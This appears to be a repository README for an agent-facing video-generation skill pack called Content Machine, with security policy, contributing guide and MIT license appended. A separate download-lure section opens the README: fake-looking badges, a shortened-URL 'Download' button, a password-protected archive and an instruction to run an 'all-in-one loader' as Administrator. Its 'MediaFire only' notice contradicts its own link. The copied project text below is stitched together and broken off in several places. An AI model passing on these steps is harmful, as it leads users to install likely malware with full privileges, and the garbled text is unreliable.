<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## What You Should Understand Fast

- **It is for agent harnesses:** you already use Claude Code, Codex CLI,
  Cursor, or a repo-aware coding agent.
- **It installs into your repo:** the pack materializes
  `.content-machine/skills/` and `.content-machine/flows/` so your agent
  can read them locally.
- **It is results-first:** Reddit stories over gameplay, motion-card
  explainers, SaaS shorts, listicles, micro-docs, longform clips, and
  3D/procedural gameplay backgrounds.
- **It is not a black box:** every meaningful step writes files another
  agent or human can inspect.
- **The README is the tour:** commands and low-level runtime details are
  in the deeper docs.

## See The Results

The default story example is the familiar Reddit-post-over-gameplay
format: full-screen Subway Surfers-style gameplay, a Reddit opener card,
then bold captions over the same gameplay.

<p align="center">
## Use It In Your Repo

Open your agent inside the repo where you want to make videos and paste
this:

```text
Install Content Machine in this repo and use it as the local short-form
video skill pack.

Follow the Agent Harness Install guide:
## Skills At A Glance

| If You Want                              | Give Your Agent This Skill Or Flow                                                                                                                                                               |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
## How It Works

Content Machine splits the work so agents do not have to improvise a
video pipeline from scratch:

- **Skills hold judgment:** when to use a lane, what good output looks
  like, what to reject, and which artifacts should exist.
- **Flows coordinate jobs:** topic-to-video, longform-to-shorts,
  reverse-engineering a winner, diagnostics, and repo showcase runs.
- **Runtime tools execute stages:** script generation, source analysis,
  audio, timestamps, visuals, captions, render, asset ledger, and
  publish-prep review.
- **Artifacts stay local:** runs are meant to be inspectable,
  resumable, reviewable, and safe for another agent to continue.

## What It Can Make

- Reddit/AITA/confession stories over gameplay.
- Stock-footage explainers and faceless mixed-media shorts.
- Motion-card lessons, coded graphics, and 3D/procedural backgrounds.
- Text-message drama, receipt reveals, and social-thread overlays.
- SaaS/product shorts with problem, proof, demo, and CTA beats.
- Fast-facts listicles and micro-documentary breakdowns.
- Longform podcast, interview, talk, or screen-recording clips.
- Reviewed MP4s with provenance, captions, source rights, and quality
  gates.
- Hook, retention, platform-fit, and metrics feedback loops that improve
  future shorts without pretending virality is guaranteed.

## Start Here

- **Use it in your project:**
## Repo Map

| Path               | Why It Exists                                                   |
| ------------------ | --------------------------------------------------------------- |
| `skills/`          | Agent-readable capability docs and examples                     |
| `flows/`           | Executable multi-step workflow manifests and operator notes     |
| `docs/user/`       | Human install, quickstart, examples, quality, and showcase docs |
| `docs/demo/`       | Preview MP4s/GIFs, manifest, provenance, and maturity labels    |
| `scripts/harness/` | Runtime entrypoints for repo checkouts                          |
| `agent/`           | Packaged install and runner binaries                            |
| `src/harness/`     | Reusable logic behind agent-facing runtime tools                |
| `src/`             | TypeScript media, render, scoring, validation, and providers    |
| `archive/`         | Frozen legacy CLI/control-plane surfaces                        |

## Current Direction

Content Machine is intentionally not a giant all-in-one video app. The
active direction is a small, reliable local runtime that coding agents
can use well: choose the right short-form lane, preserve intermediate
files, review before promotion, and keep the legacy `cm` shell thin.

## License

MIT


---

# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 0.x     | :white_check_mark: |

## Reporting a Vulnerability

**Do not report security vulnerabilities through public GitHub issues.**

Instead, please email security concerns to the project maintainers.

Include:

- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

You will receive a response within 48 hours. If the issue is confirmed, we will:

1. Work on a fix privately
2. Release a patch
3. Credit you in the release notes (unless you prefer anonymity)

## Security Best Practices for Contributors

- Never commit API keys or secrets
- Use `.env` files (listed in `.gitignore`)
- Validate all external inputs with Zod schemas
- Review dependencies for known vulnerabilities


---

# Contributing

Thanks for your interest in Content Machine! Here's how to get started.

## Setup

```bash
## Development Workflow

1. Create a branch: `git checkout -b my-feature`
2. Make your changes
3. Run checks: `npm run quality` (typecheck, lint, format, tests)
4. Commit and open a PR

### Running Checks Individually

```bash
npm run typecheck      # TypeScript
npm run lint:fix       # ESLint (auto-fix)
npm run format         # Prettier
npm test               # Vitest (watch mode)
npm run test:run       # Vitest (single run)
npm run test:coverage  # With coverage report
npm run docs:check     # User/demo docs, links, and showcase status
npm run dup:check      # Duplication check when refactoring
```

## Pull Requests

Before submitting:

- [ ] `npm run quality` passes
- [ ] No hardcoded secrets
- [ ] New code has test coverage
- [ ] Docs updated if behavior changed

Keep PRs focused — one feature or fix per PR. We'll review within a few days.

## Code Style

- TypeScript with strict mode
- camelCase for variables/functions, PascalCase for types, kebab-case for files
- Structured logging via Pino (`createLogger('module-name')`)
- Errors use types from `src/core/errors.ts`

## Documentation

- User docs live in `docs/user/` — keep these approachable
- Developer docs live in `docs/dev/` — dated filenames use `YYYYMMDD` suffix convention
- Reference docs in `docs/reference/` are auto-generated — edit the YAML registries instead:
  - `registry/repo-facts.yaml` → `npm run repo-facts:gen`
  - `registry/ubiquitous-language.yaml` → `npm run glossary:gen`

## License

By contributing, you agree that your contributions will be licensed under the MIT License.


---

MIT License

Copyright (c) 2026 45ck

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
